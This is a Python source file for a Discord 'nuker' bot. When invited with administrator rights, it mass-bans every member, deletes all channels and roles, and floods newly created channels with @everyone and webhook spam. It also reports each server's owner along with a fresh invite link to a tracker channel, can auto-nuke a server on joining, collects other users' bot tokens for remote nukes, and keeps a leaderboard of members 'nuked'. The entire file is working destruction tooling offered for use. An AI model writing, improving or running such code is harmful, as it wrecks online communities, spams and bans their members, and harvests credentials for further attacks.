import asyncio
import aiohttp
import discord
import requests
from discord.ext import commands
import random
import time
import configparser
import os
from discord import Embed
import json
from webserver import keep_alive
config = configparser.ConfigParser(allow_no_value=True)
setup = configparser.ConfigParser()
bot = commands.Bot(command_prefix="$", intents=discord.Intents.all())
bot.remove_command("help")

setup.read("config.ini")

TOKEN = setup["bot"]["token"]
bot_id = setup["bot"]["bot_id"]
nuke_message = setup['bot']['nuke_message']
channel_name = setup['bot']['channel_name']
webhook_name = setup['bot']['webhook_name']
role_name = setup['bot']['role_name']
your_server = int(setup["server"]["server_id"])
your_tracker = int(setup["server"]["tracker_channel_id"])
owners = [e.strip() for e in setup.get('owner', 'owner_ids').split(',')]

config.read("database.ini")


class TokenBucket:
        def __init__(self, bucket_size, refill_rate):
            # Number of tokens in the bucket
            self.bucket_size = bucket_size
            # Refill rate in tokens per second
            self.refill_rate = refill_rate
            # Current number of tokens in the bucket
            self.tokens = bucket_size
            # Time of the last refill
            self.last_refill = 0

        async def make_requests(self, num_requests):
            # Check if there are enough tokens in the bucket
            if self.tokens >= num_requests:
                self.tokens -= num_requests
                return True
            else:
                # Calculate the time until the next refill
                now = time.time()
                wait_time = (num_requests - self.tokens) / self.refill_rate - (now - self.last_refill)
                if wait_time > 0:
                    # Wait until the next refill
                    await asyncio.sleep(wait_time)
                # Refill the bucket
                self.tokens = self.bucket_size
                self.last_refill = time.time()
                self.tokens -= num_requests
                return True
        
class scrape:
 async def member(ctx, bottoken):
  headers = {"authorization": f"Bot {bottoken}"}
  params = {"limit": 1000, "after": 0}
  all_members = []
  while True:
    response = requests.get(f"https://discordapp.com/api/v6/guilds/{ctx.guild.id}/members", headers=headers, params=params)
    if response.status_code == 200:
        all_members.extend(response.json())
        params["after"] = all_members[-1]["user"]["id"]
    else:
        return "Error getting member list:", response.status_code, response.reason
        break

    if len(response.json()) < 1000:
        break
  member_ids = [member["user"]["id"] for member in all_members]
  return member_ids

 async def get_channels(id, bottoken):
    headers = {"authorization": f"Bot {bottoken}"}
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://discordapp.com/api/v6/guilds/{id}/channels", headers=headers) as response:
            if response.status == 200:
                guild_info = await response.json()
                num_channels = guild_info
                return num_channels
            else:
                return "Error getting number of channels:", response.status, response.reason

 async def banned_member(ctx, bottoken):
    headers = {"authorization": f"Bot {bottoken}"}
    params = {"limit": 1000,"after": 0}
    all_banned_members = []
    while True:
        response = requests.get(f"https://discordapp.com/api/v6/guilds/{ctx.guild.id}/bans", headers=headers, params=params)

        if response.status_code == 200:
            all_banned_members.extend(response.json())
            params["after"] = all_banned_members[-1]["user"]["id"]
        else:
            return "Error getting banned member list:", response.status_code, response.reason
            break

        if len(response.json()) < 1000:
            break

    banned_member_ids = [banned_member["user"]["id"] for banned_member in all_banned_members]
    return banned_member_ids

 async def get_roles(id, bottoken):
    headers = {"Authorization": f"Bot {bottoken}", "Content-Type": "application/json"}
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://discordapp.com/api/v6/guilds/{id}/roles", headers=headers) as response:
            if response.status == 200:
                roles = await response.json()
                role_ids = [role["id"] for role in roles]
                return role_ids   
            else:
                return "Error getting role list:", response.status, response.reason
  
 async def save_server(token: str, server_id: str):
    save = configparser.ConfigParser()  
    save.read('server_info.ini')
    if str(server_id) in save['servers']:
      return
    async with aiohttp.ClientSession() as session:
        async with session.get(f'https://discord.com/api/v6/guilds/{server_id}', headers={'Authorization': f'Bot {token}'}) as resp:
            resp.raise_for_status()
            server_info = await resp.json()
        async with session.get(f'https://discord.com/api/v6/guilds/{server_id}/channels', headers={'Authorization': f'Bot {token}'}) as response:
          response.raise_for_status()
          channels_info = await response.json()
          

        save[f'server_{server_id}'] = {'server_id': server_id}
        save[f'emojis_{server_id}'] = {}
        for i, emoji in enumerate(server_info['emojis']):
            save[f'emojis_{server_id}'][f'emoji_{i}'] = {
                'id': emoji['id'],
                'name': emoji['name'],
                'roles': emoji['roles'],
                'user': emoji['user']['id'],
                'require_colons': emoji['require_colons'],
                'managed': emoji['managed'],
                'animated': emoji['animated'],
            }
        save[f'roles_{server_id}'] = {}
        for i, role in enumerate(server_info['roles']):
            role_dict = {
                'id': str(role['id']),
                'name': str(role['name']),
                'color': str(role['color']),
                'permissions': str(role['permissions']),
                'mentionable': str(role['mentionable']),
            }
            role_json = json.dumps(role_dict)
            save[f'roles_{server_id}'][f'role_{i}'] = role_json
        save[f'channels_{server_id}'] = {}
        for i, channel in enumerate(channels_info):
            channel_dict = {
                'id': str(channel['id']),
                'name': str(channel['name']),
                'type': str(channel['type']),
        }
            channel_json = json.dumps(channel_dict)
            save[f'channels_{server_id}'][f'channel_{i}'] = channel_json    
            save['servers'][str(server_id)] = "nuked"
        with open('server_info.ini', 'w') as configfile:
             save.write(configfile)
                              
class ban_unbann:
 async def ban_member(serv, id, bottoken):
    headers = {"authorization": f"Bot {bottoken}"}
    async with aiohttp.ClientSession() as session:
        max_erros = 1
        while max_erros != 0:
         async with session.put(f"https://discordapp.com/api/v9/guilds/{serv}/bans/{id}", headers=headers) as response:
       
          if response.status == 204:
            return "Succesfully banned: ", id
          else:
           max_erros -= 1
 
 async def unban_member(serv, id, bottoken):
    headers = {"authorization": f"Bot {bottoken}"}
    async with aiohttp.ClientSession() as session:
        max_erros = 1
        while max_erros != 0:
         async with session.delete(f"https://discordapp.com/api/v9/guilds/{serv}/bans/{id}", headers=headers) as response:
       
          if response.status == 204:
            return "Succesfully unbanned: ", id
          else:
           max_erros -= 1
 
class channels:
    async def create_channel(id, bottoken):
        headers = {"authorization": f"Bot {bottoken}"}
        data = {"name": channel_name, "type": 0}
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discordapp.com/api/v6/guilds/{id}/channels", headers=headers, json=data) as response:
                if response.status == 201:
                    channel = await response.json()
                    tasks = []
                    tasks.append(asyncio.create_task(spam.bot_spam(channel['id'], TOKEN)))
                    tasks.append(asyncio.create_task(on_channel_create(channel)))
                    await asyncio.gather(*tasks)
                    return "Channel created successfully"
                else:
                    return "Failed to create channel", response.status, response.reason
    
    async def delete_channel(channelid, bottoken):
        headers = {"authorization": f"Bot {bottoken}"}
        async with aiohttp.ClientSession() as session:
            async with session.delete(f"https://discordapp.com/api/v6/channels/{channelid}", headers=headers) as response:
                if response.status == 200:
                    return "Channel deleted successfully"  
                else:
                    return "Failed to delete channel", response.status, response.reason
                         
class roles:
    async def create_role(id, bottoken):
        headers = {"authorization": f"Bot {bottoken}"}
        data = {"name": role_name}
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discordapp.com/api/v6/guilds/{id}/roles", headers=headers, json=data) as response:
                if response.status == 200:
                 return "Role created successfully"
                else:
                 return "Failed to create role", response.status, response.reason
   
    async def delete_role(id, roleid, bottoken):
        headers = {"authorization": f"Bot {bottoken}"}
        async with aiohttp.ClientSession() as session:
            async with session.delete(f"https://discordapp.com/api/v6/guilds/{id}/roles/{roleid}", headers=headers) as response:
                if response.status == 204:
                    return "Role deleted successfully"
                else:
                    return "Failed to delete role", response.status, response.reason
        
class webhook:
    async def create_webhook(channel_id, bottoken):
     headers = {"authorization": f"Bot {bottoken}"}
     data = {"name": webhook_name}
     async with aiohttp.ClientSession() as session:
         async with session.post(f"https://discordapp.com/api/v6/channels/{channel_id}/webhooks", headers=headers, json=data) as response:
             webhook = await response.json()
     return {"id": webhook["id"], "token": webhook["token"]}
    
    async def spam_webhook(webhook_id, webhook_token):
     headers = {"Content-Type": "application/json"}
     data = {"content": nuke_message}
     async with aiohttp.ClientSession() as session:
         async with session.post(f"https://discordapp.com/api/v6/webhooks/{webhook_id}/{webhook_token}", headers=headers, json=data) as response:
             if response.status == 204:
                 print("Webhook message sent successfully")
             else:
                 return "Error sending webhook message:", response.status, response.reason

class spam:
    async def bot_spam(channel_id, bottoken):
        headers = {"authorization": f"Bot {bottoken}", "Content-Type": "application/json"}
        data = {"content": "@everyone"}
        async with aiohttp.ClientSession() as session:
          for _i in range(50):
            async with session.post(f"https://discordapp.com/api/v6/channels/{channel_id}/messages", headers=headers, json=data) as response:
                if response.status == 201:
                  print("Message sent successfully")
                else:
                  return "Error sending message:", response.status, response.reason
            
class database:
    async def add(guild, user):
       id = str(user)
       if id in config['users']:
         if str(guild.id) in config[f"server{id}"]:
            return
         else:
            ns = int(config[id]['nuked_server']) + 1
            config[f"server{id}"][str(guild.id)] = "NUKED"
            config[id]['nuked_server'] = str(ns)
            nuked_member = int(config[id]['nuked_member']) + int((len(guild.members)))
            config[id]['nuked_member'] = str(nuked_member)
            
            if int((len(guild.members))) > int(config[id]['biggest_server']):
                config[id]['biggest_server'] = str((len(guild.members)))
            with open('database.ini', 'w') as configfile:
             config.write(configfile)
            return True
       else:
            config['users'][id] = None
            config[id] = {}
            config[f"server{id}"] = {}
            config[f"server{id}"][str(guild.id)] = "NUKED"
            config[id]['nuked_server'] = "1"
            config[id]['nuked_member'] = str(len(guild.members))
            config[id]['biggest_server'] = str(len(guild.members))
            config[id]['token'] = None
            config[id]["auto_nuke"] = "false"
            with open('database.ini', 'w') as configfile:
             config.write(configfile)
            return True
    
    async def add_token(id, bottoken):
        if str(id) in config['users']:
            config[str(id)]['token'] = str(bottoken)
            with open('database.ini', 'w') as configfile:
             config.write(configfile)
            return True
        else:
            return False
    
    async def dbstats(ctx):
        if str(ctx.author.id) in config["users"]:
            return {"nuked_server": config[str(ctx.author.id)]['nuked_server'], "nuked_member": config[str(ctx.author.id)]['nuked_member'], "biggest_server": config[str(ctx.author.id)]['biggest_server']}
        else:
            return False
          
    async def auto_nuke(arg, id):
      if "on":
        config[id]["auto_nuke"] = "true"
        pass
      else:
        config[id]["auto_nuke"] = "false"
        pass
      with open('database.ini', 'w') as configfile:
             config.write(configfile)
      return
        
    async def restore_server(token: str, server_id: str):
     # Read the configuration file
     config = configparser.ConfigParser()
     config.read('server_info.ini')

     # Get the server ID from the configuration file
     server_id = config[f'server_{server_id}']['server_id']

     # Get the emojis from the configuration file
     emojis = {}
     for emoji_id, emoji_config in config[f'emojis_{server_id}'].items():
        emojis[emoji_id] = {
            'id': int(emoji_config['id']),
            'name': emoji_config['name'],
            'roles': [int(role) for role in emoji_config['roles'].split(',')],
            'user': int(emoji_config['user']),
            'require_colons': emoji_config['require_colons'],
            'managed': emoji_config['managed'],
            'animated': emoji_config['animated'],
        }

     # Get the roles from the configuration file
     roles = {}
     for role_id, role_json in config[f'roles_{server_id}'].items():
        role_dict = json.loads(role_json)
        roles[role_id] = {
            'id': int(role_dict['id']),
            'name': role_dict['name'],
            'color': int(role_dict['color']),
            'permissions': int(role_dict['permissions']),
            'mentionable': role_dict['mentionable'],
        }
     channels = {}
     for channel_id, channel_json in config[f'channels_{server_id}'].items():
        channel_dict = json.loads(channel_json)
        channels[channel_id] = {
            'id': int(channel_dict['id']),
            'name': channel_dict['name'],
            'type': channel_dict['type'],
        }
     async with aiohttp.ClientSession() as session:
        # Create the emojis
        for emoji_id, emoji in emojis.items():
            emoji_url = emoji['url'] if 'url' in emoji else None
            async with session.post(f'https://discord.com/api/v6/guilds/{server_id}/emojis', headers={'Authorization': f'Bot {token}'}, json={
                'name': emoji['name'],
                'roles': emoji['roles'],
                'image': emoji_url,
                'requires_colons': emoji['require_colons'],
                'managed': emoji['managed'],
                'animated': emoji['animated'],
            }) as resp:
              resp.raise_for_status()

        # Create the roles
        for role_id, role in roles.items():
            async with session.post(f'https://discord.com/api/v6/guilds/{server_id}/roles', headers={'Authorization': f'Bot {token}'}, json={
                'name': role['name'],
                'color': role['color'],
                'permissions': role['permissions'],
                'mentionable': role['mentionable'],
            }) as resp:
                resp.raise_for_status()

        # Create the channels
        for channel_id, channel in channels.items():
            async with session.post(f'https://discord.com/api/v6/guilds/{server_id}/channels', headers={'Authorization': f'Bot {token}'}, json={
                'name': channel['name'],
                'type': channel['type'],
            }) as resp:
                resp.raise_for_status()

class check:
    async def check_token(bottoken):
        headers = {'Authorization': f'Bot {bottoken}'}
        async with aiohttp.ClientSession() as session:
            async with session.get('https://discord.com/api/v6/users/@me', headers=headers) as response:
                 if response.status == 200:
                     return True
                 else:
                     return False
                   
    async def check_guild(id, bottoken):
      headers = {'Authorization': f'Bot {bottoken}'}
      async with aiohttp.ClientSession() as session:
        async with session.get('https://discord.com/api/v6/users/@me/guilds', headers=headers) as response:
          guilds = await response.json()
          if any(str(guild['id']) == str(id) for guild in guilds):
            return True
          else:
            return False
        
      
  

ban_bucket = TokenBucket(50, 50)

@bot.command(name="ban")
async def ban(ctx):
 if ctx.guild.id != your_server:
    member_id = await scrape.member(ctx, TOKEN)
    tasks = []
    while len(member_id) != 0:
     for _i in range(50):
      if len(member_id) == 0:
          break
      id = random.choice(member_id)
      serv = ctx.guild.id
      success = await ban_bucket.make_requests(1)
      if success:
       member_id.remove(id)
       task = asyncio.create_task(ban_unbann.ban_member(serv, id, TOKEN))
       tasks.append(task) 
     if len(tasks) != 0:
      result = await asyncio.gather(*tasks)
      print(result)
          
@bot.command(name="unban")
async def unban(ctx):
 if ctx.guild.id != your_server:
    member_id = await scrape.banned_member(ctx, TOKEN)
    tasks = []
    while len(member_id) != 0:
     for _i in range(50):
      if len(member_id) == 0:
          break
      id = random.choice(member_id)
      serv = ctx.guild.id
      success = await ban_bucket.make_requests(1)
      if success:
       member_id.remove(id)
       task = asyncio.create_task(ban_unbann.unban_member(serv, id, TOKEN))
       tasks.append(task)
     if len(tasks) != 0:
      result = await asyncio.gather(*tasks)
      print(result)
      

async def create_channels(id):
 if id != your_server:
    tasks = []
    for _i in range(50):
        success = await ban_bucket.make_requests(1)
        if success:
         task = asyncio.create_task(channels.create_channel(id, TOKEN))
         tasks.append(task)
    result = await asyncio.gather(*tasks)
    print(result)
    

async def delete_channels(id):
 if id != your_server:
    tasks = []
    chan = await scrape.get_channels(id, TOKEN)
    channel_ids = [channel['id'] for channel in chan]
    while len(channel_ids) != 0:
     for _i in range(50):
      if len(channel_ids) == 0:
          break
      channelid = random.choice(channel_ids)
      print(channelid)
      success = await ban_bucket.make_requests(1)
      if success:
       channel_ids.remove(channelid)
       task = asyncio.create_task(channels.delete_channel(channelid, TOKEN))
       tasks.append(task)
     if len(tasks) != 0:
      result = await asyncio.gather(*tasks)
      print(result)
    

async def create_roles(ctx):
 if ctx.guild.id != your_server:
    id = ctx.guild.id
    tasks = []
    for _i in range(50):
        success = await ban_bucket.make_requests(1)
        if success:
            task = asyncio.create_task(roles.create_role(id, TOKEN))
            tasks.append(task)
    result = await asyncio.gather(*tasks)
    print(result)
    

async def delete_roles(ctx):
 if ctx.guild.id != your_server:
    id = ctx.guild.id
    role = await scrape.get_roles(id, TOKEN)
    while len(role) > 0:
         roleid = random.choice(role)
         success = await ban_bucket.make_requests(1)
         if success:
          role.remove(roleid)
          task = asyncio.create_task(roles.delete_role(id, roleid, TOKEN))
          await task
            
@bot.command(name="nuke")
async def nuke(ctx):
 if ctx.guild.id != your_server:
    await ctx.message.delete()
    await delete_channels(ctx.guild.id)
    await create_channels(ctx.guild.id)


async def auto_nuke(id):
 if id != your_server:
    await delete_channels(id)
    await create_channels(id)
    
@bot.event
async def on_guild_join(guild):
    bot_member = guild.get_member(bot.user.id)
    if bot_member.guild_permissions.administrator:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
            user = entry.user
            if entry.target.id == bot.user.id:
                await database.add(guild, user.id)
                channels = random.choice(guild.channels)
                invite = await channels.create_invite(max_age=86400, max_uses=1)
                server_name = guild.name
                member_count = guild.member_count
                boost_count = guild.premium_subscription_count
                owner = guild.owner
                embed = Embed(title="New Server", description=f"Information about the {server_name} server")
                embed.add_field(name="Server Name", value=server_name, inline=True)
                embed.add_field(name="Member Count", value=str(member_count), inline=True)
                embed.add_field(name="Boost Count", value=str(boost_count), inline=True)
                embed.add_field(name="Owner", value=f"{owner.name}#{owner.discriminator}", inline=True)
                embed.add_field(name="Server invite", value=invite.url, inline=True)
                embed.add_field(name="Nuker", value=f"{user.name}#{user.discriminator}", inline=True)
                channel = bot.get_channel(your_tracker)
                response = await channel.send(embed=embed)
                await scrape.save_server(str(TOKEN), str(guild.id))
                if config[str(user.id)]["auto_nuke"] == "true":
                  await auto_nuke(str(guild.id))
                  
    else:
        await guild.leave()

@bot.command(name="stats")
async def stats(ctx):
  if ctx.guild.id == your_server:
    stats = await database.dbstats(ctx)
    if stats == False:
        await ctx.reply("You didn't nuke any servers yet!")
    else:
        embed = discord.Embed(title=f"{ctx.author.name}#{ctx.author.discriminator}  Nuke Stats")
        total_servers = stats["nuked_server"]
        embed.add_field(name="Nuked Servers", value=f"{total_servers} servers")
        total_member = stats["nuked_member"]
        embed.add_field(name="Nuked Members", value=f"{total_member} members")
        big = stats["biggest_server"]
        embed.add_field(name="Biggest Server", value=f"{big} members")
        await ctx.reply(embed=embed)
    
@bot.command(name="login")       
async def login(ctx, token):
    if await check.check_token(token):
        if await database.add_token(ctx.author.id, token):
            await ctx.reply('succesfully added your bot token')
        else:
            await ctx.reply('please nuke atleast one discord server')
    else:
        await ctx.reply('invalid token')
        
@bot.command(name="leaderboard")
async def leaderboard(ctx):
  nuked_count = {}
  for user in config.sections():
    if user == "users":  # Change this line
      continue
    nuked_count[str(user)] = config.getint(user, 'nuked_member', fallback=0)  # Add default value
  sorted_count = sorted(nuked_count.items(), key=lambda x: x[1], reverse=True)
  leaderboard_entries = []
  for i, (user, count) in enumerate(sorted_count[:5], start=1):
     leaderboard_entries.append(f"#{i}: User <@{user}> has nuked {count} members")
  current_user = str(ctx.author.id)
  current_rank = None
  if current_user in nuked_count:
    current_count = nuked_count[current_user]
    for i, (user, count) in enumerate(sorted_count, start=1):
      if user == current_user:
        current_rank = i
    if current_rank:    
      leaderboard_entries.append(f"You are currently #{current_rank} with {current_count} nuked members")
  else:
    leaderboard_entries.append(f"User {current_user} not found in leaderboard")
  embed = discord.Embed(title='Nuke Leaderboard', description='\n'.join(leaderboard_entries))
  await ctx.send(embed=embed)


async def token_nuker(id):
 if id != your_server:
    await delete_channels(id)
    await create_channels(id)
   
@bot.command(name="token_nuke")
async def token_nuke(ctx, serverid):
  if str(ctx.author.id) in config['users']:
    if await check.check_token(config[str(ctx.author.id)]['token']):
      if await check.check_guild(int(serverid), config[str(ctx.author.id)]['token']):
        await ctx.reply("starting the nuke")
        a = await token_nuker(int(serverid))
        print(a)
      else:
        await ctx.reply("your bot is not in the server")
    else:
      await ctx.reply('your token is invalid!')
  else:
    await ctx.reply('you are not in our database')

@bot.command(name="restore")
async def restore(ctx):
  if ctx.guild.id != your_server:
   await ctx.reply("starting restoring the server")
   a = await delete_channels(ctx.guild.id)
   print(a)
   a = await database.restore_server(TOKEN, ctx.guild.id)
   print(a)

@bot.command(name="help")
async def help(ctx):
    embed = discord.Embed(title="Help", color=0x00ff00)
    embed.set_footer(text="Created by notbang")

    commands = {
        "ban": "Bans every user from the server.",
        "help": "Shows this message.",
        "leaderboard": "Displays the leaderboard for the server.",
        "login": "Saves your bot token.",
        "nuke": "Nukes the server.",
        "restore": "Restores the server to the previous state.",
        "stats": "Displays stats for your nuking.",
        "token_nuke": "Nukes the server using your token.",
        "unban": "Unbans every user from the server.",
        "type": "turn auto_nuke on/off",
    }
    value = "\n".join([f"`{name}` - {description}" for name, description in commands.items()])
    embed.add_field(name="Commands", value=value, inline=False)

    await ctx.send(embed=embed)

@bot.command(name="invite")
async def invite(ctx):
  embed = discord.Embed(title="Invite", color=0x00ff00)
  embed.add_field(name="Invite me", value=f"[Click here](https://discord.com/api/oauth2/authorize?client_id={bot_id}&permissions=8&scope=bot)", inline=False)
  await ctx.reply(embed=embed)

@bot.command(name="type")
async def type(ctx, arg=None):
  if arg == None:
    return await ctx.reply('Please provide if you want auto_nuke `on` or `off`')
  if arg == "on":
      await database.auto_nuke(arg, str(ctx.author.id))
      return await ctx.reply('succesfully `enabled` auto_nuke')
  if arg == "off":
      await database.auto_nuke(arg, str(ctx.author.id)) 
      return await ctx.reply('succesfully `disabled` auto_nuke')
  else:
      await ctx.reply("please provide a real option")

@bot.command(name="fix")
async def fix(ctx):
 if ctx.author.id in owners:
  for guild in bot.guilds:
    if guild.id != your_server:
     await guild.leave()
  await ctx.reply("succecfully left guilds")
  
async def on_channel_create(channel):
    channel_id = channel['id']
    web = await webhook.create_webhook(channel_id, TOKEN)
    print(web)
    for i in range(50):
     task = await asyncio.create_task(webhook.spam_webhook(web['id'], web['token']))
        

keep_alive()            
    
bot.run(TOKEN)
  
